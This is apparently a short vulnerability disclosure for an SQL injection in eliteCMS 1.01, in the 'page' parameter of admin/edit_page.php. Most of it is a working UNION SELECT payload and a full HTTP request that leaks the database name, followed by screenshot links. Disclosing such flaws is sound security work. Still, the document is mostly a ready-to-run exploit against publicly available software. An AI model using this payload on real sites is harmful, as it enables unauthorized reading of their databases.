# Elitecms v1.01 by elitecms has SQL injection

vendors: https://elitecms.net/download.php

Vulnerability File: eliteCMS1.01/admin/edit_page.php?page=

Vulnerability location: ip/eliteCMS1.01/admin/edit_page.php?page=, page

dbname: elitecms101

[+] Payload: /eliteCMS1.01/admin/edit_page.php?page=-1%20union%20select%201,database(),3,4,5,6,7,8,9,10,11--+ // Leak place ---> page

```sql
GET /eliteCMS1.01/admin/edit_page.php?page=-1%20union%20select%201,database(),3,4,5,6,7,8,9,10,11--+ HTTP/1.1
Host: 192.168.1.108
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=307ef75a2f3ab4c1103d8a1e90cf120e
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/167533963-4b3bc32f-e40b-469d-8c3c-c54d43a55c83.png)

![image](https://user-images.githubusercontent.com/54017627/167533923-71deea82-05a1-4e43-8e7b-977756583420.png)
